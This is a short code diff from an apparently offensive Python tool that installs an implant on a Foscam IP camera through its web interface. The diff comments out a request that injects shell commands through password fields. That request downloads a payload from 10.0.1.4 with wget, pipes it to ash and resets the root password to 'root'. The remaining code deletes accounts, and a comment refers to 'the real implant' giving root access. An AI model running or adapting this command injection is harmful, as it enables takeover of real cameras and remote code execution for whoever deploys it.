@@ -22,9 +22,9 @@ class Installer:
         print(f'[D] {command}')
         print(requests.get(command))
         #Only needed to give us debug access during development, in the real implant, not necessary because the implant gives us root access already
-        command = f'{self.BaseURL}?cmd=changePassword&usr=admin&pwd=&usrName=ssmith&oldPwd=`wget+http://10.0.1.4/FOSCAM_3.41.2a+-O+-+|+ash`&privilege=2&newPwd=`echo+"root:root"|chpasswd`'
-        print(f'[D] {command}')
-        print(requests.get(command))
+        # command = f'{self.BaseURL}?cmd=changePassword&usr=admin&pwd=&usrName=ssmith&oldPwd=`wget+http://10.0.1.4/FOSCAM_3.41.2a+-O+-+|+ash`&privilege=2&newPwd=`echo+"root:root"|chpasswd`'
+        # print(f'[D] {command}')
+        # print(requests.get(command))
         command = f'{self.BaseURL}?cmd=delAccount&usrName=ssmith&usr=admin&pwd='
         print(f'[D] {command}')
         print(requests.get(command))
